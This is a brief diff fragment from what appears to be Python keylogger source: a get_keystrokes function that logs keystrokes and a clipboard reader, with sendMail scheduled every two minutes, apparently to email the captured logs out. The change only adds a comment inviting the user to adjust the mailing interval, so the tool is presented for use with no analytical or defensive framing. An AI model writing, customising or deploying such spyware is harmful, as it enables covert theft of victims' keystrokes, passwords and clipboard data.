@@ -73,7 +73,7 @@ def get_clipboard():
         CloseClipboard() # Close the clipboard
 
 def get_keystrokes(log_dir, log_name): # Function to monitor and log keystrokes
-    schedule.every(2).minutes.do(sendMail)
+    schedule.every(2).minutes.do(sendMail) # You can change from 2 minutes to your desired minute for mailing.
     # Delete logger before starting
     if os.path.exists(log_dir +"\\"+ log_name):
         os.remove(log_dir +"\\"+ log_name)
